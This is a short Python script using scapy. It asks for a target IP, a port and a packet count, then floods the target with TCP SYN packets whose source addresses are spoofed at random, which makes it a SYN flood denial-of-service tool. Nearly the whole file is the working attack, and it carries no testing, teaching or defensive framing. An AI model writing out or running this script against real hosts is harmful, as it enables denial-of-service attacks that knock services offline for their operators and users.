from scapy.all import send, IP, TCP
import random

def run():
    # Get user input for destination IP, destination port, and packet count
    dst_ip = input("Enter the destination IP address: ")
    dst_port = int(input("Enter the destination port: "))
    packet_count = int(input("Enter the number of packets to send: "))

    # Loop to generate and send packets
    for _ in range(packet_count):
        # Generate packet with random source IP, source port, sequence number, and window size
        packet = IP(src=".".join(str(random.randint(0, 255)) for _ in range(4)), dst=dst_ip) / \
                 TCP(sport=random.randint(1024, 65535), dport=dst_port, flags="S",
                     seq=random.randint(1000, 9000), window=random.randint(1000, 9000))
        send(packet, verbose=0)  # Send packet silently

    print(f"{packet_count} packets have been sent to {dst_ip}:{dst_port}.")

# Call the run function to start the program
if __name__ == "__main__":
    run()
